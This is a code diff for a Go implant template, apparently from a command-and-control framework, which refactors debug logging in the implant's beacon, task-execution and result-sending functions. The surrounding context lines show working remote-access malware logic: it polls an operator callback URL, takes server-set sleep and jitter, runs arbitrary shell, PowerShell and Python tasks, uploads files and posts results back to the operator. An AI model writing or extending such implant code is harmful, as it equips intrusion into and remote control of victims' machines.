@@ -571,6 +571,13 @@ var (
 	currentJitter float64 = jitter
 )
 
+// debugLog formats debug messages with timestamp
+func debugLog(format string, v ...interface{}) {
+	timestamp := time.Now().Format("2006-01-02 15:04:05")
+	message := fmt.Sprintf(format, v...)
+	fmt.Printf("[%s] [DEBUG] %s\n", timestamp, message)
+}
+
 func main() {
 	{{if .Debug}}
 	// DEBUG MODE: Console window visible for troubleshooting
@@ -876,8 +883,8 @@ func sleepMask(duration time.Duration) {
 
 func beacon() {
 	{{if .Debug}}
-	fmt.Println("[DEBUG] Sending beacon request...")
-	fmt.Printf("[DEBUG] Request URL: %s/beacon\n", callbackURL)
+	debugLog("Sending beacon request...")
+	debugLog("Request URL: %s/beacon", callbackURL)
 	{{end}}
 	
 	client := &http.Client{
@@ -887,7 +894,7 @@ func beacon() {
 	req, err := http.NewRequest("GET", callbackURL+"/beacon", nil)
 	if err != nil {
 		{{if .Debug}}
-		fmt.Printf("[DEBUG] ERROR: Failed to create beacon request: %v\n", err)
+		debugLog("ERROR: Failed to create beacon request: %v", err)
 		{{end}}
 		return
 	}
@@ -899,31 +906,31 @@ func beacon() {
 	if sessionID != "" {
 		req.Header.Set("X-Session-ID", sessionID)
 		{{if .Debug}}
-		fmt.Printf("[DEBUG] Sending session ID: %s\n", sessionID)
+		debugLog("Sending session ID: %s", sessionID)
 		{{end}}
 	} else {
 		{{if .Debug}}
-		fmt.Println("[DEBUG] No session ID yet (first beacon)")
+		debugLog("No session ID yet (first beacon)")
 		{{end}}
 	}
 	sessionMu.Unlock()
 	
 	{{if .Debug}}
-	fmt.Printf("[DEBUG] Request headers: User-Agent=%s, X-Session-ID=%s\n", userAgent, req.Header.Get("X-Session-ID"))
+	debugLog("Request headers: User-Agent=%s, X-Session-ID=%s", userAgent, req.Header.Get("X-Session-ID"))
 	{{end}}
 	
 	resp, err := client.Do(req)
 	if err != nil {
 		{{if .Debug}}
-		fmt.Printf("[DEBUG] ERROR: Beacon request failed: %v\n", err)
+		debugLog("ERROR: Beacon request failed: %v", err)
 		{{end}}
 		return
 	}
 	defer resp.Body.Close()
 	
 	{{if .Debug}}
-	fmt.Printf("[DEBUG] Beacon response status: %d\n", resp.StatusCode)
-	fmt.Printf("[DEBUG] Response headers: %v\n", resp.Header)
+	debugLog("Beacon response status: %d", resp.StatusCode)
+	debugLog("Response headers: %v", resp.Header)
 	{{end}}
 	
 	// Handle commands
@@ -931,13 +938,13 @@ func beacon() {
 		var response map[string]interface{}
 		if err := json.NewDecoder(resp.Body).Decode(&response); err != nil {
 			{{if .Debug}}
-			fmt.Printf("[DEBUG] ERROR: Failed to decode response: %v\n", err)
+			debugLog("ERROR: Failed to decode response: %v", err)
 			{{end}}
 			return
 		}
 		
 		{{if .Debug}}
-		fmt.Printf("[DEBUG] Response body: %+v\n", response)
+		debugLog("Response body: %+v", response)
 		{{end}}
 		
 		// Store session ID from response
@@ -950,16 +957,16 @@ func beacon() {
 			sessionMu.Unlock()
 			{{if .Debug}}
 			if oldSessionID != sid {
-				fmt.Printf("[DEBUG] Received new session ID: %s\n", sid)
+				debugLog("Received new session ID: %s", sid)
 			}
 			{{end}}
 		}
 		
 		if tasks, ok := response["tasks"].([]interface{}); ok {
 			{{if .Debug}}
-			fmt.Printf("[DEBUG] Received %d tasks\n", len(tasks))
+			debugLog("Received %d tasks", len(tasks))
 			for i, task := range tasks {
-				fmt.Printf("[DEBUG] Task %d: %+v\n", i, task)
+				debugLog("Task %d: %+v", i, task)
 			}
 			{{end}}
 			for _, task := range tasks {
@@ -973,7 +980,7 @@ func beacon() {
 			// Update delay from server response (adaptive sleep)
 			currentDelay = sleep
 			{{if .Debug}}
-			fmt.Printf("[DEBUG] Server sleep interval: %.2f seconds\n", sleep)
+			debugLog("Server sleep interval: %.2f seconds", sleep)
 			{{end}}
 		}
 		
@@ -981,12 +988,12 @@ func beacon() {
 			// Update jitter from server response
 			currentJitter = jitterVal
 			{{if .Debug}}
-			fmt.Printf("[DEBUG] Server jitter: %.2f%%\n", jitterVal*100)
+			debugLog("Server jitter: %.2f%%", jitterVal*100)
 			{{end}}
 		}
 	} else {
 		{{if .Debug}}
-		fmt.Printf("[DEBUG] Beacon returned non-200 status: %d\n", resp.StatusCode)
+		debugLog("Beacon returned non-200 status: %d", resp.StatusCode)
 		{{end}}
 	}
 }
@@ -996,7 +1003,7 @@ func executeTask(task map[string]interface{}) {
 	taskID, _ := task["id"].(string)
 	
 	{{if .Debug}}
-	fmt.Printf("[DEBUG] Executing task: id=%s, type=%s\n", taskID, taskType)
+	debugLog("Executing task: id=%s, type=%s", taskID, taskType)
 	{{end}}
 	
 	switch taskType {
@@ -1006,7 +1013,7 @@ func executeTask(task map[string]interface{}) {
 		}
 	case "kill":
 		{{if .Debug}}
-		fmt.Printf("[DEBUG] Kill command received, terminating implant...\n")
+		debugLog("Kill command received, terminating implant...")
 		{{end}}
 		// Send result before exiting (best effort)
 		sendResult("kill", taskID, "Implant terminating...")
@@ -1206,9 +1213,9 @@ func executeModule(taskID, moduleID string, task map[string]interface{}) {
 		
 		{{if .Debug}}
 		if isPowerShell {
-			fmt.Printf("[DEBUG] Executing PowerShell script with 60s timeout...\n")
+			debugLog("Executing PowerShell script with 60s timeout...")
 		} else if isPython {
-			fmt.Printf("[DEBUG] Executing Python script with 60s timeout...\n")
+			debugLog("Executing Python script with 60s timeout...")
 		}
 		{{end}}
 		
@@ -1217,19 +1224,19 @@ func executeModule(taskID, moduleID string, task map[string]interface{}) {
 		{{if .Debug}}
 		if ctx.Err() == context.DeadlineExceeded {
 			if isPowerShell {
-				fmt.Printf("[DEBUG] PowerShell execution timed out after 60 seconds\n")
+				debugLog("PowerShell execution timed out after 60 seconds")
 			} else if isPython {
-				fmt.Printf("[DEBUG] Python execution timed out after 60 seconds\n")
+				debugLog("Python execution timed out after 60 seconds")
 			}
 		}
 		if err != nil {
 			if isPowerShell {
-				fmt.Printf("[DEBUG] PowerShell execution error: %v\n", err)
+				debugLog("PowerShell execution error: %v", err)
 			} else if isPython {
-				fmt.Printf("[DEBUG] Python execution error: %v\n", err)
+				debugLog("Python execution error: %v", err)
 			}
 		}
-		fmt.Printf("[DEBUG] Output length: %d bytes\n", len(output))
+		debugLog("Output length: %d bytes", len(output))
 		{{end}}
 		
 		if err != nil {
@@ -1277,7 +1284,7 @@ func executeModule(taskID, moduleID string, task map[string]interface{}) {
 
 func executeCommand(cmd string) string {
 	{{if .Debug}}
-	fmt.Printf("[DEBUG] Executing command: %s\n", cmd)
+	debugLog("Executing command: %s", cmd)
 	{{end}}
 	
 	// Execute command via os/exec
@@ -1285,7 +1292,7 @@ func executeCommand(cmd string) string {
 	parts := strings.Fields(cmd)
 	if len(parts) == 0 {
 		{{if .Debug}}
-		fmt.Println("[DEBUG] ERROR: Empty command")
+		debugLog("ERROR: Empty command")
 		{{end}}
 		return ""
 	}
@@ -1365,8 +1372,8 @@ func uploadFile(taskID, path, data string) {
 
 func sendResult(taskType, taskID, result string) {
 	{{if .Debug}}
-	fmt.Printf("[DEBUG] Sending result for task: %s (type: %s)\n", taskID, taskType)
-	fmt.Printf("[DEBUG] Result URL: %s/result\n", callbackURL)
+	debugLog("Sending result for task: %s (type: %s)", taskID, taskType)
+	debugLog("Result URL: %s/result", callbackURL)
 	{{end}}
 	
 	client := &http.Client{Timeout: 10 * time.Second}
@@ -1378,19 +1385,19 @@ func sendResult(taskType, taskID, result string) {
 	jsonData, err := json.Marshal(payload)
 	if err != nil {
 		{{if .Debug}}
-		fmt.Printf("[DEBUG] ERROR: Failed to marshal result: %v\n", err)
+		debugLog("ERROR: Failed to marshal result: %v", err)
 		{{end}}
 		return
 	}
 	
 	{{if .Debug}}
-	fmt.Printf("[DEBUG] Payload JSON: %s\n", string(jsonData))
+	debugLog("Payload JSON: %s", string(jsonData))
 	{{end}}
 	
 	req, err := http.NewRequest("POST", callbackURL+"/result", bytes.NewReader(jsonData))
 	if err != nil {
 		{{if .Debug}}
-		fmt.Printf("[DEBUG] ERROR: Failed to create result request: %v\n", err)
+		debugLog("ERROR: Failed to create result request: %v", err)
 		{{end}}
 		return
 	}
@@ -1403,11 +1410,11 @@ func sendResult(taskType, taskID, result string) {
 	if sessionID != "" {
 		req.Header.Set("X-Session-ID", sessionID)
 		{{if .Debug}}
-		fmt.Printf("[DEBUG] Request headers: User-Agent=%s, Content-Type=application/json, X-Session-ID=%s\n", userAgent, sessionID)
+		debugLog("Request headers: User-Agent=%s, Content-Type=application/json, X-Session-ID=%s", userAgent, sessionID)
 		{{end}}
 	} else {
 		{{if .Debug}}
-		fmt.Println("[DEBUG] WARNING: No session ID available for result request")
+		debugLog("WARNING: No session ID available for result request")
 		{{end}}
 	}
 	sessionMu.Unlock()
@@ -1415,15 +1422,15 @@ func sendResult(taskType, taskID, result string) {
 	resp, err := client.Do(req)
 	if err != nil {
 		{{if .Debug}}
-		fmt.Printf("[DEBUG] ERROR: Failed to send result: %v\n", err)
+		debugLog("ERROR: Failed to send result: %v", err)
 		{{end}}
 		return
 	}
 	defer resp.Body.Close()
 	
 	{{if .Debug}}
-	fmt.Printf("[DEBUG] Result response status: %d\n", resp.StatusCode)
-	fmt.Printf("[DEBUG] Result response headers: %v\n", resp.Header)
+	debugLog("Result response status: %d", resp.StatusCode)
+	debugLog("Result response headers: %v", resp.Header)
 	{{end}}
 }
 `
